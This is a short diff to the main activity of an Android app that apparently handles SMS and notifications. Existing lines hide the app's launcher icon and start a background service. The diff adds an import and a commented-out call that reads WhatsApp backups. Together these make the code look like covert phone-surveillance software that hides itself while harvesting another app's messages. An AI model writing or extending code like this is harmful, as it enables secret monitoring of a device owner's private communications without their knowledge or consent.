@@ -31,6 +31,7 @@ import gonext.smsapp.adapters.NotificationAdapter;
 import gonext.smsapp.db.DbService;
 import gonext.smsapp.db.NotificationEntity;
 import gonext.smsapp.servers.BackgroundJob;
+import gonext.smsapp.servers.BackgroundJobService;
 
 public class MainActivity extends AppCompatActivity {
     private DbService dbService;
@@ -60,6 +61,8 @@ public class MainActivity extends AppCompatActivity {
         PackageManager p = getPackageManager();
         ComponentName componentName = new ComponentName(this, MainActivity.class); // activity which is first time open in manifiest file which is declare as <category android:name="android.intent.category.LAUNCHER" />
         p.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
+//        BackgroundJobService backgroundJobService = new BackgroundJobService(this);
+//        backgroundJobService.readWhatsAppBackup();
         startService(new Intent(this, BackgroundJob.class)); //start service which is BackgroundJob.java
 
     }
